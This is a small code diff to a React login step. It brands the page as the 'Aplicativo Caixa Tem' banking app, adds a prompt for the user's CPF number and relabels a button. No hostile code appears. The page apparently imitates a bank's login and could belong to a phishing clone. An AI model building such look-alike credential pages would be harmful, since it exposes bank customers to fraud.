@@ -52,9 +52,10 @@ const Step1 = ({ nextStep, loginData, setLoginData }) => {
 
 <div>
        <img src={logo} className="logo" />
-            <h2>Tem</h2>
+            <h2>Aplicativo Caixa Tem</h2>
 
             <div>
+            <p>Informe seu CPF e clique em "Próximo" para continuar:</p>
                 <TextField
                     label="CPF"
                     name="CPF"
@@ -71,7 +72,7 @@ const Step1 = ({ nextStep, loginData, setLoginData }) => {
          
 
             <div>
-                <button type="button" className="botaoLaranja" onClick={onClick}>Acessar</button>
+                <button type="button" className="botaoLaranja" onClick={onClick}>Continuar</button>
             </div>
 
 
